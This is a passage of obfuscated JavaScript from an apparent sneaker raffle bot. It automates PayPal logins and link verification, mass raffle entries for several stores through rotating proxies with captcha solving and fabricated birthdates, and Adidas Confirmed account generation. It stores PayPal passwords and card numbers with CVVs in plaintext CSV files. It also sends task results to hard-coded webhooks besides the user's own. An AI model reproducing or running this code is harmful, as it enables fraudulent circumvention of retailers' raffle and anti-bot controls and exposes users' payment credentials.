        var _0xf56519 = '', _0x127b3c = 0x0;
    async function _0x1208fc() {
        var _0x4d2d26 = _0xaf9669['readFileSync']('../accounts/paypal.csv', 'utf-8');
        let _0x124603 = _0x6aec87['parse'](_0x4d2d26, { 'header': !![] })['data'];
        console['log']('Choose\x20a\x20Paypal\x20to\x20use:\x0a');
        for (var _0x455813 = 0x0; _0x455813 < _0x124603['length']; _0x455813++) {
            console['log']('(' + _0x455813 + ')\x20' + _0x124603[_0x455813]['Email']);
        }
        console['log']('\x0a(' + _0x124603['length'] + ')\x20' + _0x5dc29b['cyan']('Add\x20a\x20new\x20account'));
        let _0x1bc531 = await _0x160288['get']('Option');
        if (_0x1bc531['Option'] < _0x124603['length'])
            return _0x124603[_0x1bc531['Option']];
        console['clear'](), console['log']('Adding\x20a\x20new\x20account\x0aEnter\x20your\x20paypal\x27s\x20email:\x0a');
        let _0x1a3931 = {}, _0x308c16 = await _0x160288['get']('Email');
        _0x1a3931['Email'] = _0x308c16['Email'];
        var _0x3c314b = Math['round'](Math['random']() * (_0x34856d['length'] - 0x1));
        _0x1a3931['Proxy'] = _0x34856d[_0x3c314b], console['clear'](), console['log']('Enter\x20your\x20paypal\x27s\x20password:\x0a');
        let _0x522dd4 = await _0x160288['get']('Password');
        return _0x1a3931['Password'] = _0x522dd4['Password'], _0xaf9669['appendFileSync']('../accounts/paypal.csv', '\x0a' + _0x1a3931['Email'] + ',' + _0x1a3931['Password'] + ',' + _0x1a3931['Proxy']), _0x1a3931;
    }
    let _0x4d76d8 = await _0x1208fc();
    var _0xc9c153 = [];
    console['clear'](), console['log']('How\x20many\x20links\x20would\x20you\x20like\x20to\x20verify\x20on\x20this\x20paypal?');
    let _0x4a1595 = await _0x160288['get']('Amount'), _0x291c41 = _0x4a1595['Amount'];
    async function _0x1949e5() {
        let _0x57db73 = 0x0;
        var _0x5ae651 = new _0x569e4e({
            'user': _0x165c4b['masterMail'],
            'password': _0x165c4b['masterPassword'],
            'host': 'imap.gmail.com',
            'port': 0x3e1,
            'tls': !![],
            'autotls': 'always'
        });
        function _0x19a757(_0x47826f) {
            _0x5ae651['openBox']('INBOX', ![], _0x47826f);
        }
        _0x5ae651['once']('ready', function () {
            _0x19a757(function (_0x10ce72, _0x52020a) {
                console['clear'](), console['log']('Looking\x20For\x20Links');
                if (_0x10ce72)
                    throw _0x10ce72;
                _0x5ae651['seq']['search']([
                    'UNSEEN',
                    [
                        'SUBJECT',
                        'PayPal'
                    ]
                ], function (_0x3168ea, _0x23f2b8) {
                    if (!_0x23f2b8 || !_0x23f2b8['length'])
                        console['log'](_0x5b438b() + '\x20[' + _0x88f401 + ']\x20No\x20mails\x20found'), _0x5ae651['end']();
                    else {
                        _0x23f2b8 = _0x23f2b8['slice'](0x0, _0x291c41);
                        var _0x5d06a3 = _0x5ae651['seq']['fetch'](_0x23f2b8, {
                            'bodies': '',
                            'markSeen': !![]
                        });
                        _0x5d06a3['on']('message', function (_0x2b2b46, _0x16884f) {
                            var _0x506569 = '(#' + _0x16884f + ')\x20';
                            _0x2b2b46['on']('body', function (_0x18b5da, _0x420e6d) {
                                _0x2736cb(_0x18b5da, (_0x57b73f, _0x12641f) => {
                                    if (_0x12641f['subject'] == 'PayPal\x20Konto\x20bestätigen' || _0x12641f['subject'] == 'Confirm\x20your\x20PayPal\x20account') {
                                        mes = _0x12641f['text']['split']('[')[0x2];
                                        var _0x3941c2 = mes['split'](']')[0x0];
                                        _0xc9c153['push'](_0x3941c2);
                                    }
                                });
                            }), _0x2b2b46['once']('end', function () {
                                _0x57db73++;
                            });
                        }), _0x5d06a3['once']('error', function (_0x394807) {
                            console['log']('Fetch\x20error:\x20' + _0x394807);
                        }), _0x5d06a3['once']('end', function () {
                            _0x5ae651['end']();
                        });
                    }
                });
            });
        }), _0x5ae651['once']('error', function (_0x5ca02d) {
            console['log'](_0x5dc29b['red'](_0x5ca02d['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox');
        }), _0x5ae651['once']('end', async function () {
        }), _0x5ae651['connect']();
    }
    try {
        _0x1949e5(), await _0x415e3e(0xfa0), console['log']('Found\x20' + _0xc9c153['length'] + '\x20Links\x20in\x20Mailbox');
    } catch {
        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..'), await _0x415e3e(0xfa0);
    }
    var _0xabcf33;
    _0x424e52('' + _0x88f401);
    var _0x32bc46 = _0x4d76d8['Proxy']['split'](':'), _0x2a3bf1;
    try {
        _0x2a3bf1 = await _0x275ae5['launch']({
            'userDataDir': 'sessions/' + _0x4d76d8['Email'],
            'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
            'headless': ![],
            'args': [
                '--proxy-server=' + _0x32bc46[0x0] + ':' + _0x32bc46[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
    } catch {
        _0x2a3bf1 = await _0x275ae5['launch']({
            'userDataDir': 'sessions/' + _0x4d76d8['Email'],
            'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
            'headless': ![],
            'args': [
                '--proxy-server=' + _0x32bc46[0x0] + ':' + _0x32bc46[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
    }
    try {
        console['log'](_0x5b438b() + '\x20[' + _0x88f401 + ']\x20Getting\x20Session');
        const _0x522eb8 = await _0x2a3bf1['newPage']();
        await _0x522eb8['authenticate']({
            'username': '' + _0x32bc46[0x2],
            'password': '' + _0x32bc46[0x3]
        }), await _0x522eb8['setViewport']({
            'width': 0x230,
            'height': 0x2d0
        }), await _0x522eb8['goto']('https://www.paypal.com/signin');
        try {
            console['log'](_0x5b438b() + '\x20[' + _0x88f401 + ']\x20Logging\x20in\x20to\x20your\x20Paypal\x20account..'), await _0x522eb8['waitForSelector']('#email');
            let _0x392c45 = await _0x522eb8['$eval']('#email', _0x35df0b => _0x35df0b['getAttribute']('value'));
            if (_0x392c45 == '') {
                await _0x522eb8['type']('#email', _0x4d76d8['Email']), await _0x415e3e(0x1d3);
                let _0x2cd4a6 = await _0x522eb8['$']('#splitPassword');
                _0x2cd4a6 && (await _0x522eb8['click']('#btnNext'), await _0x415e3e(0xa28)), await _0x522eb8['type']('#password', _0x4d76d8['Password']), await _0x415e3e(0x35c), await _0x522eb8['click']('#btnLogin');
            } else
                await _0x522eb8['type']('#password', _0x4d76d8['Password']), await _0x415e3e(0x35c), await _0x522eb8['click']('#btnLogin');
            await _0x522eb8['waitForSelector']('#reactContainer__balance', { 'timeout': 0x493e0 }), console['log'](_0x5b438b() + '\x20[' + _0x88f401 + ']\x20Successfully\x20logged\x20in'), await _0x415e3e(0x2710);
        } catch (_0x8bb5ae) {
            throw new Error('Login\x20session\x20expired\x20' + _0x8bb5ae);
        }
        for (var _0x392c20 = 0x0; _0x392c20 < _0xc9c153['length']; _0x392c20++) {
            console['log'](_0x5b438b() + '\x20[' + _0x88f401 + ']\x20Task\x20' + (_0x392c20 + 0x1) + '\x20:\x20Starting\x20Verification'), _0x424e52(_0x88f401 + '\x20Task\x20' + (_0x392c20 + 0x1) + '\x20/\x20' + _0xc9c153['length']);
            const _0x581983 = await _0x2a3bf1['newPage']();
            await _0x581983['goto']('' + _0xc9c153[_0x392c20], { 'waitUntil': 'networkidle2' }), await _0x415e3e(0xbb8);
            try {
                const _0xce874d = await _0x581983['$']('#challenge-heading');
                _0xce874d && (console['log'](_0x5b438b() + '\x20[' + _0x88f401 + ']\x20Task\x20' + (_0x392c20 + 0x1) + '\x20:\x20' + _0x5dc29b['yellow']('2FA\x20Required')), await _0x581983['waitForSelector']('.CheckoutButton_buttonWrapper_2VloF', { 'timeout': 0x493e0 }));
                await _0x415e3e(0x9c40), await _0x581983['waitForSelector']('#payment-submit-btn'), await _0x581983['$eval']('#payment-submit-btn', _0x30f312 => _0x30f312['click']()), await _0x581983['click']('#payment-submit-btn');
                try {
                    await _0x581983['waitForSelector']('img[alt=\x22AFEW\x20STORE\x22]'), await _0x415e3e(0x5dc), console['log'](_0x5dc29b['green'](_0x5b438b() + '\x20[' + _0x88f401 + ']\x20Task\x20' + (_0x392c20 + 0x1) + '\x20:\x20Link\x20Verified'));
                } catch (_0x475ca4) {
                    _0xf56519 = 'yes';
                    throw new Error('Payment\x20Rejected:\x20' + _0x475ca4['message']);
                } finally {
                    if (_0xf56519 == 'yes' && _0x127b3c != 0x2) {
                        console['log'](_0x5dc29b['red'](_0x5b438b() + '\x20[' + _0x88f401['name'] + ']\x20Task\x20' + (_0x392c20 + 0x1) + '\x20:\x20Retrying\x20(' + _0x127b3c + '\x20/\x205)')), _0x392c20 = _0x392c20 - 0x1, _0x127b3c = _0x127b3c + 0x1;
                        continue;
                    }
                    _0xf56519 == 'yes' && _0x127b3c >= 0x2 && (_0x4d12b6(csv[_0x392c20], _0x88f401), _0xf56519 = 'no', _0x127b3c = 0x0), await _0x581983['close'](), await _0x415e3e(0x4650);
                }
            } catch (_0x141c40) {
                console['log'](_0x5dc29b['red'](_0x5b438b() + '\x20[' + _0x88f401 + ']\x20Task\x20' + (_0x392c20 + 0x1) + '\x20:\x20' + _0x141c40));
            }
        }
    } catch (_0x51eaf2) {
        console['log'](_0x5dc29b['red']('' + _0x51eaf2));
    } finally {
        await _0x2a3bf1['close']();
    }
}
const _0x461a68 = [
    {
        'name': '4ELEMENTOS',
        'modules': [{
            'name': '4ELEMENTOS\x20Raffle\x20Entries',
            'store': '4ELEMENTOS',
            'logo': 'https://cdn.lovesavingsgroup.com/logos/4elementos.jpg',
            'function': async function (_0x7e7320, _0x3844a6, _0x5e7649) {
                _0x275ae5['use'](_0x149eeb()), _0x275ae5['use'](_0x5dbd94({
                    'provider': {
                        'id': '2captcha',
                        'token': '' + _0x165c4b['captchaKey']
                    },
                    'visualFeedback': !![]
                }));
                for (var _0x1298be = 0x0; _0x1298be < _0x3844a6['length']; _0x1298be++) {
                    if (_0x2c9234 != 'yes')
                        var _0x2c9234 = '', _0x4e7176 = 0x0;
                    var _0x50f774;
                    try {
                        await _0x3da21c(_0x3844a6, _0x1298be);
                    } catch {
                        _0x2c9234 = 'no';
                        throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                    }
                    _0x424e52(_0x7e7320['name'] + '\x20Task\x20' + (_0x1298be + 0x1) + '\x20/\x20' + _0x3844a6['length'] + '\x20||\x20File:\x20' + _0x5ce28a + '\x20Proxies:\x20' + _0x268393);
                    var _0x1d594b = [
                        '40',
                        '40,5',
                        '41',
                        '42',
                        '42,5',
                        '43',
                        '44',
                        '45',
                        '45,5',
                        '46',
                        '47',
                        '47,5',
                        '48'
                    ], _0x10f111 = Math['round'](Math['random']() * (_0x1d594b['length'] - 0x1));
                    _0x3844a6[_0x1298be]['Size'] == 'RANDOM' && (_0x3844a6[_0x1298be]['Size'] = _0x1d594b[_0x10f111]);
                    var _0x2d2c55 = Math['round'](Math['random']() * (_0x5e7649['length'] - 0x1)), _0x2d0629 = _0x5e7649[_0x2d2c55]['split'](':'), _0x124385;
                    try {
                        _0x124385 = await _0x275ae5['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x2d0629[0x0] + ':' + _0x2d0629[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    } catch {
                        _0x124385 = await _0x275ae5['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x2d0629[0x0] + ':' + _0x2d0629[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    }
                    try {
                        console['log'](_0x5b438b() + '\x20[' + _0x7e7320['name'] + ']\x20Task\x20' + (_0x1298be + 0x1) + '\x20:\x20Getting\x20Session');
                        const _0x288438 = await _0x124385['newPage']();
                        await _0x288438['authenticate']({
                            'username': '' + _0x2d0629[0x2],
                            'password': '' + _0x2d0629[0x3]
                        }), await _0x288438['setRequestInterception'](!![]), _0x288438['on']('request', _0x2e813a => {
                            _0x2e813a['resourceType']() === 'image' || _0x2e813a['resourceType']() === 'font' || _0x2e813a['resourceType']() === 'media' ? _0x2e813a['abort']() : _0x2e813a['continue']();
                        }), await _0x288438['goto'](_0x3844a6[_0x1298be]['Url'], { 'waitUntil': 'networkidle2' }), console['log'](_0x5b438b() + '\x20[' + _0x7e7320['name'] + ']\x20Task\x20' + (_0x1298be + 0x1) + '\x20:\x20Starting\x20Entry'), await _0x415e3e(0x3e8), await _0x288438['waitForSelector']('#accept-all-gdpr'), await _0x288438['click']('#accept-all-gdpr'), await _0x288438['waitForSelector']('#main\x20>\x20div.product-container\x20>\x20div.col-lg-4.col-sm-12.sticky-right\x20>\x20div\x20>\x20div.cn_content.cn_content_type_inline\x20>\x20form\x20>\x20div\x20>\x20div\x20>\x20div\x20>\x20div\x20>\x20button'), await _0x415e3e(0xbb8);
                        let _0x4b0d49 = await _0x288438['$$']('button');
                        for (button of _0x4b0d49) {
                            let _0x485c4a = await _0x288438['evaluate'](_0x4273a3 => _0x4273a3['innerHTML'], button);
                            if (_0x485c4a['toLowerCase']()['includes']('ntame')) {
                                console['log']('click'), await button['click']();
                                break;
                            }
                        }
                        await _0x415e3e(0x1388), await _0x288438['waitForSelector']('.cn_content_type_full-screen'), console['log'](_0x5b438b() + '\x20[' + _0x7e7320['name'] + ']\x20Task\x20' + (_0x1298be + 0x1) + '\x20:\x20Checking\x20Information'), await _0x415e3e(0x3e8);
                        let _0x4f2877 = await _0x288438['$$']('input[name=\x22email\x22]');
                        await _0x4f2877[0x1]['click'](), await _0x415e3e(0x12c), await _0x288438['keyboard']['type'](_0x3844a6[_0x1298be]['Email']), await _0x415e3e(0x1c2), await _0x288438['type']('input[name=\x22Nombre\x22]', _0x3844a6[_0x1298be]['FirstName'] + '\x20' + _0x3844a6[_0x1298be]['LastName']), await _0x415e3e(0x1c2), await _0x288438['type']('input[name=\x22Direccion\x22]', _0x3844a6[_0x1298be]['Address1'] + '\x20' + _0x3844a6[_0x1298be]['HouseNumber'] + '\x20' + _0x3844a6[_0x1298be]['Address2']), await _0x415e3e(0x1c2), await _0x288438['type']('input[name=\x22Ciudad\x22]', _0x3844a6[_0x1298be]['City']), await _0x415e3e(0x1c2), await _0x288438['type']('input[name=\x22Provincia\x22]', _0x3844a6[_0x1298be]['State']), await _0x415e3e(0x1c2), await _0x288438['type']('input[name=\x22CP\x22]', _0x3844a6[_0x1298be]['Zip']), await _0x415e3e(0x1c2), await _0x288438['select']('select[name=\x22Pais\x22]', _0x3844a6[_0x1298be]['Country']), await _0x415e3e(0x1c2), await _0x288438['type']('input[name=\x22Telefono\x22]', _0x3844a6[_0x1298be]['Phone']), await _0x415e3e(0x1c2), await _0x288438['type']('input[name=\x22cumple\x22]', _0x79391d(0x1, 0x14) + '-' + _0x79391d(0x1, 0xb) + '-' + _0x79391d(0x7c6, 0x7d0), { 'delay': 0x96 }), await _0x415e3e(0x1c2), await _0x288438['type']('input[name=\x22Instagram\x22]', _0x3844a6[_0x1298be]['Follower']), await _0x415e3e(0x1c2), await _0x288438['type']('input[name=\x22Talla\x22]', _0x3844a6[_0x1298be]['Size']), await _0x415e3e(0x1f4), await _0x288438['click']('#sexo_hombre'), await _0x415e3e(0x1f4), await _0x288438['click']('#idioma_ingles'), await _0x415e3e(0x1f4), await _0x288438['click']('#privacidad_si'), await _0x415e3e(0x1f4), await _0x288438['click']('#acepta_suscripcion_si'), await _0x415e3e(0x1f4), console['log'](_0x5b438b() + '\x20[' + _0x7e7320['name'] + ']\x20Task\x20' + (_0x1298be + 0x1) + '\x20:\x20Sending\x20Request');
                        let _0x4e7c53 = await _0x288438['$$']('button');
                        for (button of _0x4e7c53) {
                            let _0x2248a9 = await _0x288438['evaluate'](_0x3a62e2 => _0x3a62e2['innerHTML'], button);
                            if (_0x2248a9['toLowerCase']()['includes']('send')) {
                                console['log']('click'), await button['click']();
                                break;
                            }
                        }
                        await _0x415e3e(0x1388), console['log'](_0x5dc29b['green'](_0x5b438b() + '\x20[' + _0x7e7320['name'] + ']\x20Task\x20' + (_0x1298be + 0x1) + '\x20:\x20Raffle\x20Entered!')), _0x2c9234 = '';
                        var _0xa9cf26 = await _0x105954(_0x3844a6[_0x1298be], _0x7e7320, 'dev', ![]), _0x25fd29 = await _0x105954(_0x3844a6[_0x1298be], _0x7e7320, 'pub', ![]);
                        const _0x2e9738 = {
                            'succesDEVMSG': { 'embeds': [_0xa9cf26] },
                            'succesPUBMSG': { 'embeds': [_0x25fd29] }
                        };
                        try {
                            _0x165c4b['webhook'] != undefined && _0x165c4b['webhook'] != '' && await _0x4d8e61(_0x165c4b['webhook'], _0x2e9738['succesDEVMSG']), await _0x415e3e(0xc8), await _0x4d8e61(_0xbd9f1e, _0x2e9738['succesDEVMSG']), await _0x415e3e(0xc8), await _0x4d8e61(_0x3ba9f8, _0x2e9738['succesPUBMSG']);
                        } catch (_0xe182ec) {
                            console['log'](_0x5dc29b['yellow'](_0x5b438b() + '\x20[' + _0x7e7320['name'] + ']\x20Task\x20' + (_0x1298be + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0xe182ec));
                        }
                    } catch (_0x3b7f9c) {
                        console['log'](_0x5dc29b['red'](_0x5b438b() + '\x20[' + _0x7e7320['name'] + ']\x20Task\x20' + (_0x1298be + 0x1) + '\x20:\x20' + _0x3b7f9c)), _0x50f774 = '' + _0x3b7f9c;
                        var _0x558d3c = await _0x105954(_0x3844a6[_0x1298be], _0x7e7320, 'dev', !![], _0x50f774), _0xa9cf26 = await _0x105954(_0x3844a6[_0x1298be], _0x7e7320, 'dev', ![]), _0x25fd29 = await _0x105954(_0x3844a6[_0x1298be], _0x7e7320, 'pub', ![]);
                        const _0x2aaafd = {
                            'succesDEVMSG': { 'embeds': [_0xa9cf26] },
                            'succesPUBMSG': { 'embeds': [_0x25fd29] }
                        };
                        _0x2aaafd['errorDEV'] = { 'embeds': [_0x558d3c] }, _0x165c4b['webhook'] != undefined && _0x165c4b['webhook'] != '' && await _0x4d8e61(_0x165c4b['webhook'], _0x2aaafd['errorDEV']), await _0x4d8e61(_0x369064, _0x2aaafd['errorDEV']), _0x3b7f9c != 'Error\x20sending\x20entry.\x20Check\x20if\x20duplicate,\x20or\x20proxies.' && (_0x2c9234 = 'yes');
                    } finally {
                        _0x124385['close']();
                        if (_0x2c9234 == 'yes' && _0x4e7176 != 0x5 && _0x50f774 != 'Size\x20Not\x20Found') {
                            console['log'](_0x5dc29b['red'](_0x5b438b() + '\x20[' + _0x7e7320['name'] + ']\x20Task\x20' + (_0x1298be + 0x1) + '\x20:\x20Retrying\x20(' + _0x4e7176 + '\x20/\x205)\x20')), _0x1298be = _0x1298be - 0x1, _0x4e7176 = _0x4e7176 + 0x1;
                            continue;
                        }
                        _0x2c9234 == 'yes' && _0x4e7176 >= 0x5 && (_0x4d12b6(_0x3844a6[_0x1298be], _0x7e7320), _0x2c9234 = 'no', _0x4e7176 = 0x0), console['log'](_0x5b438b() + '\x20[' + _0x7e7320['name'] + ']\x20Waiting\x20for\x20' + _0x165c4b['delay'] + '\x20ms'), await _0x415e3e(_0x165c4b['delay']);
                    }
                }
            }
        }]
    },
    {
        'name': 'ADIDAS\x20CONFIRMED',
        'modules': [
            {
                'name': 'CONFIRMED\x20Account\x20Generator',
                'store': 'ADIDAS\x20CONFIRMED',
                'logo': 'https://p1.hiclipart.com/preview/328/72/32/light-dock-icons-adidas-adidas-logo-png-clipart.jpg',
                'function': async function (_0x5a1a71, _0x3bc636) {
                    console['clear'](), console['log']('Preparing\x20CONFIRMED\x20Tasks..'), _0xaf9669['writeFileSync']('proxies.txt', '');
                    for (proxy in _0x3bc636) {
                        _0xaf9669['appendFileSync']('proxies.txt', _0x3bc636[proxy] + '\x0a');
                    }
                    for (var _0x47cce9 = 0x0; _0x47cce9 < _0x5a1a71['length']; _0x47cce9++) {
                        await _0x3da21c(_0x5a1a71, _0x47cce9), _0xaf9669['appendFileSync']('tasks.csv', '\x0a' + _0x5a1a71[_0x47cce9]['Url'] + ',' + _0x5a1a71[_0x47cce9]['Size'] + ',' + _0x5a1a71[_0x47cce9]['Email'] + ',' + _0x5a1a71[_0x47cce9]['Password'] + ',' + _0x5a1a71[_0x47cce9]['FirstName'] + ',' + _0x5a1a71[_0x47cce9]['LastName'] + ',' + _0x5a1a71[_0x47cce9]['Address1'] + ',' + _0x5a1a71[_0x47cce9]['Address2'] + ',' + _0x5a1a71[_0x47cce9]['HouseNumber'] + ',' + _0x5a1a71[_0x47cce9]['Zip'] + ',' + _0x5a1a71[_0x47cce9]['City'] + ',' + _0x5a1a71[_0x47cce9]['Country'] + ',' + _0x5a1a71[_0x47cce9]['State'] + ',' + _0x5a1a71[_0x47cce9]['CardNumber'] + ',' + _0x5a1a71[_0x47cce9]['ExpiryDate'] + ',' + _0x5a1a71[_0x47cce9]['CVV'] + ',' + _0x5a1a71[_0x47cce9]['NameOnCard'] + ',' + _0x5a1a71[_0x47cce9]['Phone'] + ',' + _0x5a1a71[_0x47cce9]['Follower']);
                    }
                    await _0x415e3e(0x3e8), _0x160a3e('start', [
                        'cmd',
                        '/k',
                        'py\x20modules/Confirmed/tempgen.py'
                    ], { 'shell': !![] });
                }
            },
            {
                'name': 'CONFIRMED\x20Info\x20Adder',
                'store': 'ADIDAS\x20CONFIRMED',
                'logo': 'https://p1.hiclipart.com/preview/328/72/32/light-dock-icons-adidas-adidas-logo-png-clipart.jpg',
                'function': async function (_0x394c7a, _0x4f85e1) {
                    console['clear'](), console['log']('Preparing\x20CONFIRMED\x20Tasks..');
                    for (var _0x144a68 = 0x0; _0x144a68 < _0x394c7a['length']; _0x144a68++) {
                        await _0x3da21c(_0x394c7a, _0x144a68), _0xaf9669['appendFileSync']('tasks.csv', '\x0a' + _0x394c7a[_0x144a68]['Url'] + ',' + _0x394c7a[_0x144a68]['Size'] + ',' + _0x394c7a[_0x144a68]['Email'] + ',' + _0x394c7a[_0x144a68]['Password'] + ',' + _0x394c7a[_0x144a68]['FirstName'] + ',' + _0x394c7a[_0x144a68]['LastName'] + ',' + _0x394c7a[_0x144a68]['Address1'] + ',' + _0x394c7a[_0x144a68]['Address2'] + ',' + _0x394c7a[_0x144a68]['HouseNumber'] + ',' + _0x394c7a[_0x144a68]['Zip'] + ',' + _0x394c7a[_0x144a68]['City'] + ',' + _0x394c7a[_0x144a68]['Country'] + ',' + _0x394c7a[_0x144a68]['State'] + ',' + _0x394c7a[_0x144a68]['CardNumber'] + ',' + _0x394c7a[_0x144a68]['ExpiryDate'] + ',' + _0x394c7a[_0x144a68]['CVV'] + ',' + _0x394c7a[_0x144a68]['NameOnCard'] + ',' + _0x394c7a[_0x144a68]['Phone'] + ',' + _0x394c7a[_0x144a68]['Follower']);
                    }
                    await _0x415e3e(0x3e8), _0x160a3e('start', [
                        'cmd',
                        '/k',
                        'py\x20modules/Confirmed/tempadd.py'
                    ], { 'shell': !![] });
                }
            },
            {
                'name': 'CONFIRMED\x20Entries',
                'store': 'ADIDAS\x20CONFIRMED',
                'logo': 'https://p1.hiclipart.com/preview/328/72/32/light-dock-icons-adidas-adidas-logo-png-clipart.jpg',
                'function': async function (_0x59fea0, _0x33eeb3) {
                    console['clear'](), console['log']('Preparing\x20CONFIRMED\x20Tasks..'), _0xaf9669['writeFileSync']('proxies.txt', '');
                    for (proxy in _0x33eeb3) {
                        _0xaf9669['appendFileSync']('proxies.txt', _0x33eeb3[proxy] + '\x0a');
                    }
                    for (var _0x33ce02 = 0x0; _0x33ce02 < _0x59fea0['length']; _0x33ce02++) {
                        await _0x3da21c(_0x59fea0, _0x33ce02), _0xaf9669['appendFileSync']('tasks.csv', '\x0a' + _0x59fea0[_0x33ce02]['Url'] + ',' + _0x59fea0[_0x33ce02]['Size'] + ',' + _0x59fea0[_0x33ce02]['Email'] + ',' + _0x59fea0[_0x33ce02]['Password'] + ',' + _0x59fea0[_0x33ce02]['FirstName'] + ',' + _0x59fea0[_0x33ce02]['LastName'] + ',' + _0x59fea0[_0x33ce02]['Address1'] + ',' + _0x59fea0[_0x33ce02]['Address2'] + ',' + _0x59fea0[_0x33ce02]['HouseNumber'] + ',' + _0x59fea0[_0x33ce02]['Zip'] + ',' + _0x59fea0[_0x33ce02]['City'] + ',' + _0x59fea0[_0x33ce02]['Country'] + ',' + _0x59fea0[_0x33ce02]['State'] + ',' + _0x59fea0[_0x33ce02]['CardNumber'] + ',' + _0x59fea0[_0x33ce02]['ExpiryDate'] + ',' + _0x59fea0[_0x33ce02]['CVV'] + ',' + _0x59fea0[_0x33ce02]['NameOnCard'] + ',' + _0x59fea0[_0x33ce02]['Phone'] + ',' + _0x59fea0[_0x33ce02]['Follower']);
                    }
                    await _0x415e3e(0x3e8), _0x160a3e('start', [
                        'cmd',
                        '/k',
                        'py\x20modules/Confirmed/sensor.py'
                    ], { 'shell': !![] });
                }
            }
        ]
    },
    {
        'name': 'AFEW\x20Store',
        'modules': [{
            'name': 'AFEW\x20Raffle\x20Entries',
            'store': 'AFEW',
            'logo': 'https://d19kzigy6tpscu.cloudfront.net/media/CACHE/images/logo_thumbnail/afew_logo_100x100_1647428869.png',
            'function': async function (_0x4543fd, _0xe6ee3a, _0x1ed6f3) {
                for (var _0x35133a = 0x0; _0x35133a < _0xe6ee3a['length']; _0x35133a++) {
                    _0x165c4b['AfewDelay'] = _0x165c4b['delay'];
                    var _0x4d398b;
                    if (_0x419b33 != 'yes')
                        var _0x419b33 = '', _0x5725e8 = 0x0;
                    var _0x21878e = _0xe6ee3a[_0x35133a]['Url'], _0x31c598 = _0xe6ee3a[_0x35133a];
                    _0x424e52(_0x4543fd['name'] + '\x20Task\x20' + (_0x35133a + 0x1) + '\x20/\x20' + _0xe6ee3a['length'] + '\x20||\x20File:\x20' + _0x5ce28a + '\x20Proxies:\x20' + _0x268393);
                    try {
                        await _0x3da21c(_0xe6ee3a, _0x35133a);
                    } catch {
                        _0x419b33 = 'no';
                        throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                    }
                    async function _0xe2a697(_0x152131) {
                        const _0x2b87e4 = _0xaf9669['readFileSync']('../successful-tasks.csv', 'utf8'), _0xf6bae0 = _0x6aec87['parse'](_0x2b87e4, { 'header': !![] })['data'];
                        let _0x124a36 = ![];
                        for (var _0x23e071 of _0xf6bae0) {
                            if (_0x23e071['Url'] == _0x152131['Url'] && _0x23e071['Email'] == _0x152131['Email']) {
                                _0x124a36 = !![];
                                break;
                            }
                        }
                        return _0x124a36;
                    }
                    if (await _0xe2a697(_0xe6ee3a[_0x35133a]) == !![]) {
                        console['log'](_0x5b438b() + '\x20[' + _0x4543fd['name'] + ']\x20Task\x20' + (_0x35133a + 0x1) + '\x20:\x20Task\x20Already\x20Entered,\x20Going\x20to\x20Next\x20Task');
                        continue;
                    }
                    var _0x14d42d = await _0x105954(_0xe6ee3a[_0x35133a], _0x4543fd, 'dev', ![]), _0x162080 = await _0x105954(_0xe6ee3a[_0x35133a], _0x4543fd, 'pub', ![]);
                    const _0x3f2c1e = {
                        'succesDEVMSG': { 'embeds': [_0x14d42d] },
                        'succesPUBMSG': { 'embeds': [_0x162080] }
                    };
                    if (_0xe6ee3a[_0x35133a]['Email'] == '' || _0xe6ee3a[_0x35133a]['FirstName'] == '' || _0xe6ee3a[_0x35133a]['LastName'] == '' || _0xe6ee3a[_0x35133a]['Country'] == '' || _0xe6ee3a[_0x35133a]['Size'] == '' || _0xe6ee3a[_0x35133a]['Address1'] == '' || _0xe6ee3a[_0x35133a]['Zip'] == '') {
                        console['log'](_0x5b438b() + '\x20[' + _0x4543fd['name'] + ']\x20Task\x20' + (_0x35133a + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    _0xe6ee3a[_0x35133a]['Country']['length'] == 0x2 && (_0xe6ee3a[_0x35133a]['Country'] = _0xd223b3[_0xe6ee3a[_0x35133a]['Country']]);
                    if (_0x165c4b['useRandomProxy'] = ![])
                        var _0x41e3f7 = _0x1ed6f3[_0x35133a]['split'](':');
                    else
                        var _0x258903 = Math['round'](Math['random']() * (_0x1ed6f3['length'] - 0x1)), _0x41e3f7 = _0x1ed6f3[_0x258903]['split'](':');
                    var _0x26fbb9;
                    try {
                        _0x26fbb9 = await _0x275ae5['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x41e3f7[0x0] + ':' + _0x41e3f7[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    } catch {
                        _0x26fbb9 = await _0x275ae5['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x41e3f7[0x0] + ':' + _0x41e3f7[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    }
                    try {
                        var _0x3eafe0 = JSON['parse'](_0xaf9669['readFileSync']('sizes.json', 'utf-8')), _0x21878e = _0xe6ee3a[_0x35133a]['Url'], _0x1b00eb = _0xe6ee3a[_0x35133a]['Size'], _0x59811e;
                        async function _0x4485dc() {
